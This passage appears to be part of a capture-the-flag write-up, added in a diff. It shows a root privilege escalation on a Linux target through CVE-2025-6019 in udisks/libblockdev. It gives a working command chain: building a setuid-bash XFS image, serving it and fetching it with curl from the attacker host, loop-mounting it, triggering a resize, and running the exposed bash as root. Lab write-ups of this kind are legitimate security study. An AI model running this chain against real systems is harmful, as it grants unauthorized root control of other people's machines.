+if __name__ == "__main__":
+    main()
+```
+
+I ran the script and got a access as active user. Verifying:
+```bash
+$ gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
+('yes',)
+```
+
+To get root access I exploited the [CVE-2025-6019](https://nvd.nist.gov/vuln/detail/CVE-2025-6019) which
+is a related vulnerability that allow the "allow_active" setting in Polkit permits a physically present user to take certain actions based on the session type. 
+Due to the way libblockdev interacts with the udisks daemon, an "allow_active" user on a system may be able escalate to full root privileges on the target host.<cite>https://nvd.nist.gov/vuln/detail/CVE-2025-6019</cite>
+
+To exploit this vulnerability, I executed the following commands:
+
+On Attacker Machine:
+```bash
+$ dd if=/dev/zero of=./xfs.image bs=1M count=300
+
+$ mkfs.xfs ./xfs.image
+
+$ mkdir ./xfs.mount
+
+$ mount -t xfs ./xfs.image ./xfs.mount
+
+$ cp /bin/bash ./xfs.mount
+
+$ chmod 04555 ./xfs.mount/bash
+
+$ umount ./xfs.mount
+
+$ python3 -m http.server 8000
+```
+On Target Machine the shell I got from the previous exploit:
+```bash
+$ curl http://<your-ip>:8000/xfs.image -o /tmp/xfs.image
+
+$ gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
+# ('yes',) # This confirms that the user has "allow_active" privileges
+
+$ killall -KILL gvfs-udisks2-volume-monitor
+
+$ udisksctl loop-setup --file ./xfs.image --no-user-interaction
+# Mapped file ./xfs.image as /dev/loop0.
+
+$ while true; do /tmp/blockdev*/bash -c 'sleep 10; ls -l /tmp/blockdev*/bash' && break; done 2>/dev/null &
+
+$ gdbus call --system --dest org.freedesktop.UDisks2 --object-path /org/freedesktop/UDisks2/block_devices/loop0 --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'
+
+Error: GDBus.Error:org.freedesktop.UDisks2.Error.Failed: Error resizing filesystem on /dev/loop0: Failed to unmount '/dev/loop0' after resizing it: target is busy
+
+-r-sr-xr-x. 1 root root 1406608 May 13 09:42 /tmp/blockdev.RSM842/bash
+
+$ mount
+
+$ /tmp/blockdev*/bash -p
+
+$ id 
+.... euid=0(root) ...
+
+$ cat /root/root.txt
+```
+
+This confirms that I have successfully escalated to root and read the root flag.
+
+For knowledge about the vulnerabilities, you can refer to the following resources:
+- CVE-2025-6018: https://nvd.nist.gov/vuln/detail/CVE-2025-6018
+- CVE-2025-6019: https://nvd.nist.gov/vuln/detail/CVE-2025-6019
+- Exploit for CVE-2025-6018: https://www.exploit-db.com/exploits/52386
+- Exploit for CVE-2025-6019: https://cdn2.qualys.com/2025/06/17/suse15-pam-udisks-lpe.txt
